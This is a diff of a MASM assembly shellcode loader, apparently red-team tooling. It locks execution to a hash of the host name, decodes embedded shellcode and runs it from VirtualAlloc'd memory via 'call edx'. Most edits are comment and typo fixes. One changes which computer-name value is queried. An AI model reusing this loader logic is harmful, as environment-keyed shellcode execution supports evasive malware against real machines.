@@ -37,7 +37,7 @@ includelib \masm32\lib\advapi32.lib
 
 ; -----------------------------------------------------------------------------
 ;  MASM works by single-pass, so all functions need to be declared
-;  in advance so that the lexcial analyser will work properly
+;  in advance so that the lexical analyser will work properly
 ; -----------------------------------------------------------------------------
 
 CheckExecution   PROTO 
@@ -62,6 +62,7 @@ MS_CALG_SHA1 equ 8004h
 MS_CALG_SHA1_HASHSIZE equ 20 ; The actual size of a returned SHA1 hash (20/0x14 bytes)
 
 ; The mutex name. "Local\" means per session. "Global\" means per system. Change it to whatever you want.
+; The ,0 on the end is the null terminator.
 strMutexName  db  "Local\Stufus",0    
 
 ; The hash of the authorised NetBIOS computer name. Change this to the real hash.
@@ -161,7 +162,7 @@ LOCAL currenttime:SYSTEMTIME
  ; ============================================================================
 
  ; Get the physical NETBIOS name of the host. Must free the buffer afterwards.
- invoke GetComputerInfo, CNF_ComputerNamePhysicalNetBIOS
+ invoke GetComputerInfo, CNF_ComputerNamePhysicalDnsDomain
  mov esi, eax           ; Contains the raw computer name
  invoke SafeStrLen, esi    
  mov ecx, eax           ; Contains the length of the FQDN
@@ -175,7 +176,7 @@ LOCAL currenttime:SYSTEMTIME
  ;   edi = Pointer to the hash
  ;   eax = The position in the hash
  ;   esi = Pointer to the shellcode
- ;   edx = 'Working' register (to store the current character). Am using dh.
+ ;   edx = 'Working' register (to store the current character). I'm using dh.
  mov ecx, 0
  mov eax, 0
  mov esi, offset shellcode
@@ -335,7 +336,7 @@ ExecuteShellcode PROC uses esi edi
     mov esi, offset shellcode
     mov ecx, shellcodelen
     cld
-    rep movsb
+    rep movsb ; This copies the shellcode to edi (the VirtualAlloc'd memory)
     pop edx
     call edx ; The shellcode should take over from here
   .endif
